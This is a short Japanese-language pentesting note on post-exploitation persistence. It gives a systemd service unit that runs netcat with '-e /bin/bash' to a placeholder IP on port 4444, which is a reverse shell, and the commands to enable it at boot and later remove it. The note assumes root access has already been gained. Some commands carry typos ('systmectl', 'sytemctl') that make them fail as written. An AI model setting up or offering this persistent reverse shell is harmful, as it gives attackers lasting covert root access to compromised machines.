# Persistence

## service

* unitの作成

``` shell
    # /etc/systemd/system/XXX.service
    #ncを転送してroot権限を取得している状態で作成
    [Unit]
    Description= XXXXXXXX
    After=local-fs.target detwork-online.target
    [Service]
    ExecStart=/home/XXX/Desktop/nc -v ZZZ.ZZZ.ZZZ.ZZZ 4444 -e /bin/bash
    Type=simple
    [Install]
    WantedBy=multi-user.target
```

* 作成後に必要なコマンド

``` shell
    #unit ファイル更新
    systmectl daemon-reload
    # unit ファイル自動起動有効化
    systemctl enable XXX.service
    # プログラム起動
    systemctl start XXX.service
    # 登録されているunitファイル一覧
    systemctl list-unit-files --type=service
    #削除手順
    systemctl stop XXX.service
    sytemctl disable XXX.service
    rm /etc/systemd/system/XXX.service
    systemctl daemon-reload
```
